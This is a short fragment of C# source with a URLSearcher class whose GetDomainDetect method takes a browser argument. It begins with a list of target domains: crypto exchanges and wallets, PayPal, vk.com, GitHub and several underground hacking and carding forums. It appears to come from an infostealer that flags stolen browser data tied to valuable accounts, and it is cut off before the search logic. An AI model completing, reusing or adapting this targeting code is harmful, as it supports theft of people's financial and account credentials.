...
namespace made
{
    class URLSearcher
    {
        public static string GetDomainDetect(string Browser)
        {
            try
            {
                string[] for_search = { "vk.com", "cryptonator.com", "payeer.com", "lolz.guru", "wwh-club.net", "xss.is", "bhf.io", "btc.com", "minergate.com", "blockchain.com", "github.com", "coinbase.com","paypal.com" };
